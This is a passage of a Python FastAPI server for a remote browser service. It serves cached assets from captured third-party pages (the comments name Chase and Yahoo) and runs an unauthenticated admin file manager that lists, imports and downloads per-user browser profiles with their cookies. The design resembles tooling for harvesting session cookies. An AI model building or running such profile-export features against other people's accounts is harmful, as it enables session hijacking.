            "gpu_available": bool(gpu_status.get('available', False)),
            "gpu_type": gpu_status.get('type', 'none'),
            "active_sessions": getattr(getattr(session_manager, "stats", None),
                                       "active_sessions", 0),
            # get_status() already reports the used-memory percentage; the
            # old helper never existed.
            "memory_usage_percent": gpu_status.get('memory_used_percent', 0),
        }
    else:
        response = {"status": "starting"}

    # Surface the in-memory asset cache stats so the admin panel can
    # plot cache hit rate / eviction rate over time.  The cache is
    # process-local; stats reset on restart.  We import the helper
    # lazily so the rest of the module loads even if dom_capture has
    # not been deployed alongside api.py (legacy deployments).
    try:
        from dom_capture import get_global_asset_manager
        response["asset_cache"] = get_global_asset_manager().stats()
    except Exception:
        pass

    # Build/restart stamp: after deploying, compare `build.revision` and
    # `build.uptime_seconds` to see whether the new code is live.
    response["build"] = _build_info()

    return JSONResponse(response)


# ---------------------------------------------------------------------------
# /assets/{hash} -- the in-memory asset cache endpoint
# ---------------------------------------------------------------------------
# The capture pipeline rewrites every external URL inside the captured
# HTML to ``/assets/<sha256-hex>``.  This endpoint serves the bytes
# from RAM.  Because the bytes are immutable (content-addressed) we
# can set ``Cache-Control: public, max-age=31536000, immutable`` and
# the browser will only ever request each asset ONCE.  That's what
# keeps recaptures lightweight and cache-friendly.
#
# Important: this endpoint is unauthenticated.  The captured pages
# come from arbitrary third-party sites (Chase, Yahoo, etc.) and the
# asset URLs they embed are derived from those third-party origins.
# A hash collision is infeasible (SHA-256) so the worst a malicious
# client can do is enumerate which assets are currently in cache --
# information they could already infer from the captured HTML.
#
# If you need to lock this down (e.g. behind a corporate firewall)
# the cleanest path is to require an ``X-Asset-Token`` header here
# and have client.html include that header on its asset requests.
# The iframe's <img>/<style> tags can't add custom headers, so the
# only way to enforce this is to proxy the assets through a
# dedicated worker, or to use a cookie that's set at connect time
# and implicitly forwarded.  Cookie forwarding is what most browsers
# do already.
import re as _re
# Accept either ``<64-hex>`` (used by the rewritten HTML served inside
# the iframe) or ``<64-hex>.<ext>`` (used by the client-side
# ``dispatchAssetList`` pre-fetch helper).  The hash part is exactly
# 64 lowercase hex chars (canonical SHA-256); the optional extension
# is a single '.' followed by an alphanum token -- this is enough for
# the common image/font/css/js types and stops ``..`` traversal from
# reaching the manager.  See ``_split_asset_path`` below.
_ASSET_HASH_PATTERN = _re.compile(r"^[0-9a-f]{64}(?:\.[A-Za-z0-9]+)?$")

# A small extension -> MIME-type fallback table.  The AssetManager
# already stores ``content_type`` for every registered asset, but if
# that field ever ends up empty (e.g. a buggy CDN returning no
# Content-Type) we still want the browser to render the asset
# correctly.  This mirrors the inverse of the table that lives in
# ``dom_capture._guess_ext_from_content_type`` -- they're inverses so
# the round trip is lossless.
_EXT_TO_MIME = {
    "png":     "image/png",
    "jpg":     "image/jpeg",
    "jpeg":    "image/jpeg",
    "gif":     "image/gif",
    "webp":    "image/webp",
    "svg":     "image/svg+xml",
    "ico":     "image/x-icon",
    "bmp":     "image/bmp",
    "css":     "text/css",
    "js":      "application/javascript",
    "mjs":     "application/javascript",
    "json":    "application/json",
    "woff":    "font/woff",
    "woff2":   "font/woff2",
    "ttf":     "font/ttf",
    "otf":     "font/otf",
    "eot":     "application/vnd.ms-fontobject",
}


def _split_asset_path(value: str) -> "tuple[str, str]":
    """Return (bare_hash, ext) from a route param.

    Accepts both ``"<hash>"`` and ``"<hash>.<ext>"``; the second form
    has the extension stripped and returned separately.  The caller
    is responsible for first validating the input with
    ``_ASSET_HASH_PATTERN``.
    """
    if "." in value:
        h, _, ext = value.partition(".")
        return h, ext.lower()
    return value, ""


@app.get("/assets/{hash_hex}")
async def serve_asset(hash_hex: str):
    """Serve a cached asset by its SHA-256 hash.

    Returns the raw bytes with the content-type that was registered
    when the asset was first fetched.  Sets
    ``Cache-Control: public, max-age=31536000, immutable`` so the
    browser only ever requests each asset once per session -- the
    whole point of the new architecture.

    The route accepts both ``/assets/<hash>`` (bare -- produced by the
    Python HTML rewriter) and ``/assets/<hash>.<ext>`` (with an
    extension -- produced by the client's ``dispatchAssetList`` for
    pre-caching).  The hash portion is always exactly 64 lowercase
    hex chars; the extension, when present, is informational only
    and is used as a content-type fallback when the manager entry
    lacks one.
    """
    # Defensive validation: only accept canonical SHA-256 hex strings,
    # optionally with a single '.' extension.  This stops path
    # traversal (``..``) and obvious junk from reaching the cache
    # lookup while allowing both URL forms the pipeline produces.
    if not _ASSET_HASH_PATTERN.match(hash_hex):
        return JSONResponse({"error": "invalid hash"}, status_code=400)

    hash_part, ext_part = _split_asset_path(hash_hex)

    try:
        from dom_capture import get_global_asset_manager
        manager = get_global_asset_manager()
    except Exception as exc:
        logger.error("AssetManager import failed: %s", exc)
        return JSONResponse({"error": "cache unavailable"}, status_code=503)

    # The AssetManager keys are bare hashes -- strip the optional
    # extension before the lookup.  Anything else and we'd silently
    # 404 every URL that came in with an extension.
    entry = manager.get(hash_part)
    if entry is None:
        # Could be evicted (LRU) or never registered.  Return 404 so
        # the browser falls back to the network -- the iframe's <img>
        # tags will then re-fetch the original URL, which is still
        # valid because we only rewrite to /assets/<hash> for assets
        # that WERE successfully fetched.
        return JSONResponse({"error": "asset not found"}, status_code=404)

    # Pick the best content-type.  Prefer the value the manager
    # stored when the asset was registered; fall back to the
    # extension that came in on the URL when that's empty or the
    # generic ``application/octet-stream``.
    stored_ct = (entry.content_type or "").split(";", 1)[0].strip().lower()
    if stored_ct and stored_ct != "application/octet-stream":
        media_type = stored_ct
    elif ext_part and ext_part in _EXT_TO_MIME:
        media_type = _EXT_TO_MIME[ext_part]
    else:
        media_type = entry.content_type or "application/octet-stream"

    # CORS: any origin is allowed to embed these resources.  The
    # captured iframes run under various blob: origins and the
    # assets have to be reachable from all of them.  Same for CSP:
    # the iframe's response is a blob: URL with a permissive CSP
    # we set ourselves, so cross-origin here is fine.
    headers = {
        "Cache-Control": "public, max-age=31536000, immutable",
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "GET, OPTIONS",
        "X-Content-Type-Options": "nosniff",
        "Content-Length": str(entry.size),
    }
    return Response(
        content=entry.data,
        media_type=media_type,
        headers=headers,
    )


@app.options("/assets/{hash_hex}")
async def serve_asset_options(hash_hex: str):
    """CORS preflight for /assets/{hash}[.<ext>]."""
    if not _ASSET_HASH_PATTERN.match(hash_hex):
        return JSONResponse({"error": "invalid hash"}, status_code=400)
    return Response(
        status_code=204,
        headers={
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
            "Access-Control-Max-Age": "86400",
        },
    )


@app.get("/api/cache/stats")
async def cache_stats():
    """Expose AssetManager stats for the admin panel."""
    try:
        from dom_capture import get_global_asset_manager
        manager = get_global_asset_manager()
    except Exception as exc:
        return JSONResponse({"error": str(exc)}, status_code=503)
    return JSONResponse(manager.stats())


@app.post("/api/cache/clear")
async def cache_clear():
    """Wipe the in-memory asset cache.

    Useful when debugging or when an upstream site has shipped a
    new asset version and you want to force a re-fetch.  After this
    call the next capture will re-fetch every external resource.
    """
    try:
        from dom_capture import get_global_asset_manager
        manager = get_global_asset_manager()
    except Exception as exc:
        return JSONResponse({"error": str(exc)}, status_code=503)
    await manager.clear()
    return JSONResponse({"success": True, **manager.stats()})


@app.get("/session-expired")
async def session_expired_page():
    """Serve session expired page (Part 4)"""
    return HTMLResponse("""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Session Expired</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                display: flex;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .container {
                text-align: center;
                padding: 40px;
                background: rgba(255,255,255,0.1);
                border-radius: 20px;
                backdrop-filter: blur(10px);
            }
            h1 { font-size: 2.5rem; margin-bottom: 20px; }
            p { font-size: 1.2rem; margin-bottom: 30px; opacity: 0.9; }
            button {
                padding: 15px 40px;
                font-size: 1.1rem;
                border: none;
                border-radius: 50px;
                background: white;
                color: #667eea;
                cursor: pointer;
                transition: transform 0.2s;
            }
            button:hover { transform: scale(1.05); }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Session Expired</h1>
            <p>Your session has expired due to inactivity.</p>
            <button onclick="window.location.href='/'">Reconnect</button>
        </div>
    </body>
    </html>
    """)


@app.get("/status")
async def get_status():
    """Get server status"""
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"})
    return JSONResponse(session_manager.get_status())


@app.get("/sessions")
async def list_sessions():
    """List active sessions"""
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"})
    sessions = await session_manager.get_all_sessions()
    return JSONResponse({"sessions": sessions, "count": len(sessions)})


@app.get("/gpu/status")
async def gpu_status():
    """Get GPU status"""
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"})
    return JSONResponse(session_manager.gpu_manager.get_status())


@app.get("/profiles")
async def list_profiles():
    """List all user profiles"""
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"})
    
    # Get profile manager from browser_manager
    try:
        from browser_manager import BrowserManager, _profile_io_lock
        # We need to access the profile manager - this is a workaround
        profiles = []
        profiles_dir = session_manager.config.profile_base_path
        
        import os
        from pathlib import Path
        
        profiles_path = Path(profiles_dir)
        if profiles_path.exists():
            for profile_dir in profiles_path.iterdir():
                if not profile_dir.is_dir() or profile_dir.name.startswith('.'):
                    continue
                about_file = profile_dir / "About.txt"
                cookies_file = profile_dir / "cookies.json"

                profile_info = {
                    "user_id": profile_dir.name,
                    "path": str(profile_dir),
                    "exists": True
                }

                with _profile_io_lock(profile_dir):
                    if about_file.exists():
                        profile_info["about_exists"] = True
                    if cookies_file.exists():
                        try:
                            with open(cookies_file, 'r', encoding='utf-8') as f:
                                data = json.load(f)
                                profile_info["cookie_count"] = (
                                    data.get("cookie_count", 0)
                                    if isinstance(data, dict) else 0
                                )
                        except Exception:
                            profile_info["cookie_count"] = 0
                profiles.append(profile_info)
        
        return JSONResponse({"profiles": profiles, "count": len(profiles)})
    except Exception as e:
        return JSONResponse({"error": str(e)})


@app.post("/session/{session_id}/url")
async def set_session_url(session_id: str, request: Request):
    """Set/override the URL for a specific session"""
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"})
    
    try:
        body = await request.json()
        url = body.get('url', '')
        
        if not url:
            return JSONResponse({"error": "URL is required"}, status_code=400)
        
        success = await session_manager.set_session_url(session_id, url)
        
        if success:
            return JSONResponse({"success": True, "session_id": session_id, "url": url})
        else:
            return JSONResponse({"error": "Session not found"}, status_code=404)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/session/{session_id}/refresh")
async def refresh_session(session_id: str):
    """Refresh a sleeping/inactive session"""
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"})
    
    success = await session_manager.refresh_session(session_id)
    
    if success:
        return JSONResponse({"success": True, "session_id": session_id})
    else:
        return JSONResponse({"error": "Session not found"}, status_code=404)


def _build_system_metrics_payload() -> Dict[str, Any]:
    """Shared metrics payload used by the admin dashboard and system monitor."""
    if not session_manager:
        return {
            "cpu": {"percent": 0.0},
            "memory": {"percent": 0.0, "used_mb": 0, "total_mb": 0},
            "network": {"bytes_sent_mb": 0.0, "bytes_recv_mb": 0.0},
            "active_sessions": 0,
            "max_sessions": 20,
            "cpu_percent": 0.0,
            "memory_percent": 0.0,
            "active_sessions_count": 0,
            "timestamp": time.time(),
        }

    status = session_manager.get_status()
    gpu_status = status.get('gpu', {})

    cpu_percent = 0.0
    mem_percent = 0.0
    mem_used_mb = 0
    mem_total_mb = 0

    try:
        if PSUTIL_AVAILABLE:
            vm = psutil.virtual_memory()
            mem_percent = float(vm.percent)
            mem_used_mb = float(vm.used) / (1024 * 1024)
            mem_total_mb = float(vm.total) / (1024 * 1024)
            cpu_percent = float(psutil.cpu_percent(interval=None))
    except Exception:
        pass

    if isinstance(gpu_status, dict):
        if gpu_status.get('available'):
            cpu_percent = float(gpu_status.get('cpu_percent', cpu_percent))
            mem_percent = float(gpu_status.get('memory_percent', mem_percent))
            mem_used_mb = float(gpu_status.get('used_memory_mb', mem_used_mb))
            mem_total_mb = float(gpu_status.get('total_memory_mb', mem_total_mb) or mem_used_mb or 1)

    payload = {
        "cpu": {"percent": cpu_percent},
        "memory": {
            "percent": mem_percent,
            "used_mb": mem_used_mb,
            "total_mb": mem_total_mb,
        },
        "network": {
            "bytes_sent_mb": 0.0,
            "bytes_recv_mb": 0.0,
        },
        "active_sessions": session_manager.stats.active_sessions,
        "max_sessions": getattr(getattr(session_manager, 'config', None), 'max_sessions', 20),
        "cpu_percent": cpu_percent,
        "memory_percent": mem_percent,
        "active_sessions_count": session_manager.stats.active_sessions,
        "timestamp": time.time(),
    }
    return payload


@app.get("/metrics")
async def get_metrics():
    """Get Prometheus-compatible metrics"""
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"})

    status = session_manager.get_status()
    gpu_status = status.get('gpu', {})

    metrics = []
    metrics.append(f"# HELP active_sessions Total active browser sessions")
    metrics.append(f"# TYPE active_sessions gauge")
    metrics.append(f"active_sessions {session_manager.stats.active_sessions}")

    if gpu_status.get('available'):
        metrics.append(f"# HELP gpu_memory_usage_bytes GPU memory usage in bytes")
        metrics.append(f"# TYPE gpu_memory_usage_bytes gauge")
        metrics.append(f'gpu_memory_usage_bytes {gpu_status.get("used_memory_mb", 0) * 1024 * 1024}')
        for i, gpu in enumerate(gpu_status.get('gpus', [])):
            metrics.append(f"# GPU {gpu['id']} - {gpu['name']}")
            metrics.append(f'gpu_utilization{{gpu_id="{gpu["id"]}"}} {gpu.get("utilization", 0)}')
            metrics.append(f'gpu_memory_percent{{gpu_id="{gpu["id"]}"}} '
                          f'{(gpu.get("memory_used", 0) / max(gpu.get("memory_total", 1), 1)) * 100}')

    metrics.append(f"# HELP streaming_fps Current streaming frames per second")
    metrics.append(f"# TYPE streaming_fps gauge")
    metrics.append(f"streaming_fps {status.get('current_fps', 0)}")

    return HTMLResponse("\n".join(metrics), media_type="text/plain")


@app.get("/api/server/metrics")
async def server_metrics():
    """System metrics endpoint used by the admin dashboard."""
    return JSONResponse(_build_system_metrics_payload())


@app.get("/api/manager/stats")
async def manager_stats():
    """Compatibility alias for the admin dashboard's manager stats API."""
    return JSONResponse(_build_system_metrics_payload())


@app.websocket("/ws/manager")
async def manager_websocket_endpoint(websocket: WebSocket):
    """Push periodic system stats to the admin manager panel."""
    await websocket.accept()
    try:
        while True:
            try:
                await asyncio.wait_for(websocket.receive_text(), timeout=5.0)
            except asyncio.TimeoutError:
                payload = _build_system_metrics_payload()
                await websocket.send_json({"type": "system_stats", "data": payload})
    except WebSocketDisconnect:
        pass
    except Exception:
        pass


# ==============================
# File Manager Endpoints
# ==============================

def _normalise_file_manager_path(user_path: str) -> str:
    """Return a root-relative POSIX path for the Admin file manager."""
    value = str(user_path or "").replace("\\", "/").strip()
    if value in {"", "/", "."}:
        return ""
    return value.lstrip("/")


def safe_resolve_path(base_dir: Path, user_path: str) -> tuple[Path, bool]:
    """Resolve an Admin file-manager path without allowing traversal."""
    try:
        base = base_dir.resolve()
        relative = _normalise_file_manager_path(user_path)
        target_path = (base / relative).resolve()
        try:
            is_safe = target_path.is_relative_to(base)
        except AttributeError:
            is_safe = str(target_path) == str(base) or str(target_path).startswith(str(base) + os.sep)
        return target_path, is_safe
    except (OSError, ValueError):
        return base_dir, False


def _path_is_within(path: Path, parent: Path) -> bool:
    """Compatibility helper for checking either equal or nested paths."""
    try:
        path.resolve().relative_to(parent.resolve())
        return True
    except (ValueError, OSError):
        return False


async def _release_sessions_for_file_download(target_path: Path) -> List[str]:
    """Close sessions that own a profile before the file is read or zipped.

    Browser processes keep Chrome's profile files locked and can otherwise
    produce an incomplete archive. Only sessions whose stable profile path
    contains the requested path (or is contained by it) are released.
    """
    if not session_manager:
        return []
    try:
        async with session_manager._sessions_lock:
            active = list(session_manager.sessions.items())
    except Exception:
        return []

    profile_root = Path(getattr(getattr(session_manager, "config", None), "profile_base_path", "profiles"))
    if not profile_root.is_absolute():
        profile_root = Path(__file__).parent / profile_root
    profile_root = profile_root.resolve()
    released: List[str] = []
    for session_id, session in active:
        user_id = str(getattr(session, "user_id", "") or "").strip()
        if not user_id:
            continue
        try:
            durable_profile = (profile_root / user_id).resolve()
        except (OSError, ValueError):
            continue
        if not _path_is_within(durable_profile, profile_root):
            continue
        if not (_path_is_within(target_path, durable_profile)
                or _path_is_within(durable_profile, target_path)):
            continue
        try:
            if await session_manager.remove_session(session_id, force=True):
                released.append(session_id)
        except Exception:
            logger.warning("[File Manager] Could not release session %s before download", session_id, exc_info=True)
    return released


def _configured_profile_root(base_dir: Path) -> Path:
    """Resolve the configured durable profile directory."""
    configured = getattr(getattr(session_manager, "config", None), "profile_base_path", None)
    profile_root = Path(configured or (base_dir / "profiles"))
    if not profile_root.is_absolute():
        profile_root = base_dir / profile_root
    return profile_root.resolve()


def _resolve_file_manager_path(base_dir: Path, user_path: str) -> tuple[Path, bool, str]:
    """Resolve a file-manager path, mapping the virtual ``profiles`` folder.

    The Admin UI always addresses the profile store as ``profiles`` even when
    ``profile_base_path`` is configured elsewhere. The virtual prefix is not
    allowed to escape that configured directory.
    """
    relative = _normalise_file_manager_path(user_path)
    if relative == "profiles" or relative.startswith("profiles/"):
        profile_root = _configured_profile_root(base_dir)
        suffix = relative[len("profiles"):].lstrip("/")
        target, is_safe = safe_resolve_path(profile_root, suffix)
        return target, is_safe, relative
    target, is_safe = safe_resolve_path(base_dir, relative)
    return target, is_safe, relative


def _file_manager_child_path(current_path: str, name: str) -> str:
    current = _normalise_file_manager_path(current_path)
    return f"{current}/{name}" if current else name


def _file_manager_parent_path(current_path: str) -> Optional[str]:
    current = _normalise_file_manager_path(current_path)
    if not current:
        return None
    parent = current.rsplit("/", 1)[0]
    return parent or "/"


@app.get("/api/files/list")
async def list_files(path: str = ""):
    """List the real filesystem below the project and configured profile roots."""
    try:
        base_dir = Path(__file__).parent.resolve()
        target_path, is_safe, relative = _resolve_file_manager_path(base_dir, path)
        if relative == "" or relative == "profiles" or relative.startswith("profiles/"):
            # Keep the configured durable store visible even before the first
            # browser session has created a profile.
            _configured_profile_root(base_dir).mkdir(parents=True, exist_ok=True)
        if not is_safe:
            return JSONResponse({
                "items": [],
                "current_path": relative or "/",
                "parent_path": None,
                "error": "Access denied"
            }, status_code=403)
        if not target_path.exists():
            return JSONResponse({
                "items": [],
                "current_path": relative or "/",
                "parent_path": _file_manager_parent_path(relative),
                "error": "Path not found"
            }, status_code=404)
        if not target_path.is_dir():
            return JSONResponse({
                "items": [],
                "current_path": relative or "/",
                "parent_path": _file_manager_parent_path(relative),
                "error": "Path is not a directory"
            }, status_code=400)

        items = []
        for item in sorted(target_path.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
            try:
                stat = item.stat()
                items.append({
                    "name": item.name,
                    "path": _file_manager_child_path(relative, item.name),
                    "is_dir": item.is_dir(),
                    "size": stat.st_size if item.is_file() else 0,
                    "modified": stat.st_mtime,
                })
            except (PermissionError, OSError):
                continue

        # A profile_base_path outside the project still appears through the
        # virtual ``profiles`` entry used by the Admin UI.
        if not relative and not any(item.get("name") == "profiles" for item in items):
            items.append({
                "name": "profiles",
                "path": "profiles",
                "is_dir": True,
                "size": 0,
                "modified": _configured_profile_root(base_dir).stat().st_mtime,
            })
            items.sort(key=lambda item: (not item["is_dir"], item["name"].lower()))

        return JSONResponse({
            "items": items,
            "current_path": relative or "/",
            "parent_path": _file_manager_parent_path(relative)
        })
    except Exception as e:
        logger.error("Error listing files: %s", e, exc_info=True)
        return JSONResponse({
            "items": [],
            "current_path": _normalise_file_manager_path(path) or "/",
            "parent_path": None,
            "error": "Unable to list this directory"
        }, status_code=500)


@app.get("/api/files/profiles")
async def list_profiles():
    """List the actual configured profile storage directory."""
    return await list_files("profiles")


@app.post("/api/files/profiles/import")
async def import_profile_zip(request: Request, profile_name: str = ""):
    """Safely persist an uploaded browser-profile ZIP under profile storage.

    The archive may contain a complete Chromium user-data directory or a
    cookies.json file plus other profile state. It is extracted into a private
    staging directory first; absolute paths, traversal entries, symlinks and
    oversized archives are rejected before anything is installed.
    """
    base_dir = Path(__file__).parent.resolve()
    profile_root = _configured_profile_root(base_dir)
    staging = profile_root / f".profile-import-{uuid.uuid4().hex}"
    max_upload_bytes = 4 * 1024 * 1024 * 1024
    max_unpacked_bytes = 8 * 1024 * 1024 * 1024
    max_members = 100000

    def _safe_name(value: str) -> str:
        candidate = str(value or "").strip()
        if not candidate or candidate in {".", ".."} or "/" in candidate or "\\" in candidate:
            return ""
        if candidate.startswith(".") or len(candidate) > 120:
            return ""
        return candidate

    try:
        content_length = request.headers.get("content-length")
        if content_length and int(content_length) > max_upload_bytes:
            return JSONResponse({"error": "Profile ZIP is too large"}, status_code=413)

        profile_root.mkdir(parents=True, exist_ok=True)
        staging.mkdir(parents=True, exist_ok=False)
        upload_path = staging / "upload.zip"
        total = 0
        with upload_path.open("wb") as output:
            async for chunk in request.stream():
                total += len(chunk)
                if total > max_upload_bytes:
                    raise HTTPException(status_code=413, detail="Profile ZIP is too large")
                output.write(chunk)

        if not zipfile.is_zipfile(upload_path):
            raise HTTPException(status_code=400, detail="The uploaded file is not a ZIP archive")

        extracted = staging / "extracted"
        extracted.mkdir()
        total_unpacked = 0
        with zipfile.ZipFile(upload_path, "r") as archive:
            members = archive.infolist()
            if len(members) > max_members:
                raise HTTPException(status_code=400, detail="Profile ZIP contains too many files")
            for member in members:
                member_name = member.filename.replace("\\", "/")
                parts = [part for part in member_name.split("/") if part]
                if (not parts or member_name.startswith("/") or ":" in parts[0]
                        or any(part in {".", ".."} for part in parts)):
                    raise HTTPException(status_code=400, detail="Profile ZIP contains an unsafe path")
                if stat.S_ISLNK((member.external_attr >> 16) & 0o170000):
                    raise HTTPException(status_code=400, detail="Profile ZIP contains a symlink")
                total_unpacked += int(member.file_size or 0)
                if total_unpacked > max_unpacked_bytes:
                    raise HTTPException(status_code=413, detail="Unpacked profile is too large")
                destination = (extracted.joinpath(*parts)).resolve()
                if not _path_is_within(destination, extracted):
                    raise HTTPException(status_code=400, detail="Profile ZIP contains an unsafe path")
                if member.is_dir() or member_name.endswith("/"):
                    destination.mkdir(parents=True, exist_ok=True)
                    continue
                destination.parent.mkdir(parents=True, exist_ok=True)
                with archive.open(member, "r") as source, destination.open("wb") as target:
                    shutil.copyfileobj(source, target, length=1024 * 1024)

        children = [child for child in extracted.iterdir() if child.name != "upload.zip"]
        raw_profile_name = str(profile_name or "").strip()
        requested_name = _safe_name(raw_profile_name)
        if raw_profile_name and not requested_name:
            raise HTTPException(status_code=400, detail="Invalid profile name")
        inferred_name = ""
        source_root = extracted
        # Archives produced from the file manager have profiles/<name>/...;
        # ordinary browser exports commonly have <name>/... . Strip only the
        # known wrapper, never an arbitrary internal Default directory.
        if len(children) == 1 and children[0].is_dir():
            wrapper = children[0]
            if wrapper.name in {"profiles", "browser_profiles"}:
                source_root = wrapper
                nested = [child for child in wrapper.iterdir() if child.is_dir()]
                files = [child for child in wrapper.iterdir() if child.is_file()]
                if len(nested) == 1 and not files:
                    source_root = nested[0]
                    inferred_name = nested[0].name
            elif requested_name or not any(child.is_file() for child in children):
                source_root = wrapper
                inferred_name = wrapper.name

        final_name = requested_name or _safe_name(inferred_name)
        if not final_name:
            final_name = f"profile-{uuid.uuid4().hex[:10]}"
        target = (profile_root / final_name).resolve()
        if not _path_is_within(target, profile_root) or target == profile_root:
            raise HTTPException(status_code=400, detail="Invalid profile name")

        await _release_sessions_for_file_download(target)
        if target.exists() or target.is_symlink():
            if target.is_dir() and not target.is_symlink():
                shutil.rmtree(target)
            else:
                target.unlink()
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.move(str(source_root), str(target))
        cookies_present = (target / "cookies.json").is_file()
        return JSONResponse({
            "ok": True,
            "profile": final_name,
            "path": f"profiles/{final_name}",
            "cookies_json": cookies_present,
            "message": "Profile imported"
        })
    except HTTPException as exc:
        return JSONResponse({"error": exc.detail}, status_code=exc.status_code)
    except Exception as exc:
        logger.error("Error importing profile ZIP: %s", exc, exc_info=True)
        return JSONResponse({"error": "Unable to import profile ZIP"}, status_code=500)
    finally:
        shutil.rmtree(staging, ignore_errors=True)


@app.get("/api/profiles/favicons/{filename}")
async def get_profile_favicon(filename: str):
    """Serve favicon files from profile folders"""
    try:
        from pathlib import Path
        from browser_manager import _profile_io_lock

        if Path(filename).name != filename:
            return JSONResponse({"error": "Favicon not found"}, status_code=404)
        base_dir = Path(__file__).parent
        profiles_dir = Path(
            getattr(getattr(session_manager, "config", None), "profile_base_path", "")
            or (base_dir / "profiles")
        )
        
        # Search for the favicon in all durable profile folders. Reads share
        # the same per-parent lock as favicon writes and metadata snapshots.
        for profile_dir in profiles_dir.iterdir():
            if not profile_dir.is_dir() or profile_dir.name.startswith('.'):
                continue
            favicon_path = profile_dir / "favicons" / filename
            with _profile_io_lock(profile_dir):
                if favicon_path.exists():
                    return FileResponse(
                        favicon_path,
                        media_type="image/png"
                    )
        
        return JSONResponse({"error": "Favicon not found"}, status_code=404)
    except Exception as e:
        logger.error(f"Error serving favicon: {e}")
        return JSONResponse({"error": "Internal server error"}, status_code=500)


@app.get("/api/files/download")
async def download_file(path: str):
    """Download a single file"""
    try:
        from pathlib import Path
        
        base_dir = Path(__file__).parent.resolve()
        file_path, is_safe, _ = _resolve_file_manager_path(base_dir, path)
        if not is_safe:
            return JSONResponse({"error": "Access denied"}, status_code=403)
        if not file_path.exists():
            return JSONResponse({"error": "File not found"}, status_code=404)
        if not file_path.is_file():
            return JSONResponse({"error": "Path is not a file"}, status_code=400)

        # Release the owner before Starlette opens the real file. This is
        # targeted to the requested profile, not a global browser shutdown.
        released_sessions = await _release_sessions_for_file_download(file_path)
        response = FileResponse(
            file_path,
            filename=file_path.name,
            media_type="application/octet-stream"
        )
        if released_sessions:
            response.headers["X-Released-Sessions"] = str(len(released_sessions))
        return response
    except Exception as e:
        logger.error(f"Error downloading file: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ZIP file management
zip_jobs: Dict[str, Dict] = {}


def create_zip_archive(base_dir: Path, target_path: Path, zip_id: str, archive_prefix: str = ""):
    """Create a recursive ZIP while preserving every directory and path."""
    try:
        zip_path = base_dir / "cache" / f"{zip_id}.zip"
        zip_path.parent.mkdir(parents=True, exist_ok=True)
        prefix = Path(_normalise_file_manager_path(archive_prefix)) if archive_prefix else Path()

        def archive_name(path: Path) -> str:
            """Return a portable ZIP name with the requested virtual prefix."""
            return str(path).replace(os.sep, "/")

        def add_directory(zipf: zipfile.ZipFile, directory_name: Path) -> None:
            # ZIPs otherwise omit empty folders. Add explicit directory
            # entries so the complete tree is restored exactly on extraction.
            name = archive_name(directory_name).rstrip("/") + "/"
            if name != "/":
                zipf.writestr(name, b"")

        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
            if target_path.is_file():
                arcname = prefix if archive_prefix else Path(target_path.name)
                zipf.write(target_path, archive_name(arcname))
            else:
                # Include the selected folder itself, then walk all nested
                # directories and files. Hidden files are intentionally kept;
                # only symlinks are excluded so an archive cannot escape the
                # validated filesystem root.
                if archive_prefix:
                    add_directory(zipf, prefix)
                for root, dirs, files in os.walk(target_path, topdown=True, followlinks=False):
                    root_path = Path(root)
                    dirs[:] = sorted(
                        name for name in dirs
                        if not (root_path / name).is_symlink()
                    )
                    for directory in dirs:
                        relative_dir = (root_path / directory).relative_to(target_path)
                        add_directory(zipf, prefix / relative_dir if archive_prefix else relative_dir)
                    for file in sorted(files):
                        file_path = root_path / file
                        if file_path.is_symlink() or not _path_is_within(file_path, target_path):
                            continue
                        relative_file = file_path.relative_to(target_path)
                        arcname = prefix / relative_file if archive_prefix else relative_file
                        zipf.write(file_path, archive_name(arcname))

        zip_jobs[zip_id] = {
            "status": "completed",
            "path": str(zip_path),
            "filename": f"{target_path.name}.zip"
        }
    except Exception as e:
        logger.error("Error creating ZIP %s: %s", zip_id, e, exc_info=True)
        zip_jobs[zip_id] = {
            "status": "failed",
            "error": str(e)
        }


@app.post("/api/files/zip")
async def create_zip(path: str, background_tasks: BackgroundTasks):
    """Create a ZIP archive of a real directory or file."""
    try:
        base_dir = Path(__file__).parent.resolve()
        target_path, is_safe, relative = _resolve_file_manager_path(base_dir, path)
        if not is_safe:
            return JSONResponse({"error": "Access denied"}, status_code=403)
        if not target_path.exists():
            return JSONResponse({"error": "Path not found"}, status_code=404)
        if not (target_path.is_dir() or target_path.is_file()):
            return JSONResponse({"error": "Path cannot be archived"}, status_code=400)

        # Release only the active session(s) owning this profile before the
        # background worker starts reading its files.
        released_sessions = await _release_sessions_for_file_download(target_path)
        zip_id = str(uuid.uuid4())[:8]
        cache_dir = base_dir / "cache"
        cache_dir.mkdir(parents=True, exist_ok=True)
        zip_jobs[zip_id] = {
            "status": "creating",
            "path": None,
            "filename": f"{target_path.name}.zip",
            "released_sessions": len(released_sessions),
        }
        background_tasks.add_task(create_zip_archive, base_dir, target_path, zip_id, relative)

        return JSONResponse({
            "zip_id": zip_id,
            "status": "creating",
            "message": "ZIP creation started",
            "released_sessions": len(released_sessions),
        })
    except Exception as e:
        logger.error("Error creating ZIP: %s", e, exc_info=True)
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/files/zip/{zip_id}")
async def download_zip(zip_id: str):
    """Download a created ZIP file"""
    try:
        from pathlib import Path
        
        if zip_id not in zip_jobs:
